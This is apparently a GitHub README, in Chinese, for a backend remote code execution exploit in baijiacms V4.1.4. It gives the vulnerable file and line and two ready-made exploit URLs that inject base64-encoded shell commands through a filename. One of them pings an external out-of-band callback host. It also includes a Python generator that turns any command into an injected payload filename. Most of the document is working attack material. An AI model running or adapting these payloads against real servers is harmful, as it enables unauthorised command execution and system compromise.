# baijiacms-RCE
baijiacms后台RCE


项目地址：https://github.com/baijiacms/baijiacmsV4

版本：V4.1.4 20170105 FINAL
环境：

+ php 5.5.38
+ nginx 1.15
+ mysql 5.7.27
+ 20.04.1-Ubuntu


[README_en](https://github.com/This-is-Y/baijiacms-RCE/blob/main/README_en.md)

漏洞点在文件includes/baijiacms/common.inc.php
第654行。

![图片](https://user-images.githubusercontent.com/51741690/202916918-cb2b4576-d20b-4033-9fd4-da7cf3e4bff9.png)


# 利用

这个system的功能本来是为了执行压缩图片的。所以要利用该漏洞，需要先登录后台，在附近设置中设置图片压缩比例，否则代码无法运行到此处。
![图片](https://user-images.githubusercontent.com/51741690/202916939-4b14710d-5528-4b78-89a1-6afdb18de143.png)



EXP1：http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&act=public&do=file&op=fetch&url=http://127.0.0.1/poc.;echo${IFS}cGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==|base64${IFS}-d|bash;&status=1&beid=1
![图片](https://user-images.githubusercontent.com/51741690/202916957-60d79a4a-f01e-4e89-9a6c-4d9e13c733eb.png)




EXP2：http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&act=public&do=file&op=fetch&url=http://127.0.0.1/whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;&status=1&beid=1
![图片](https://user-images.githubusercontent.com/51741690/202916979-b8c559ac-a262-4d58-9494-1341d12b3d80.png)




其中poc可以使用一下代码生成，随后开启web服务确保可以被访问到即可

```python
import base64

webpath = "/home/ubuntu/test/"
cmd = input("cmd>>> ") 


b64cmd = base64.b64encode(cmd.encode()).decode()

payload = f"echo {b64cmd}|base64 -d|bash"

print(payload)
payload = payload.replace(' ','${IFS}')
print(payload)

name = input("name>>>")
payload = f"{name}.;{payload};"
print(payload)

with open(file=webpath+payload,mode='w')as f:
    f.write('1')

```





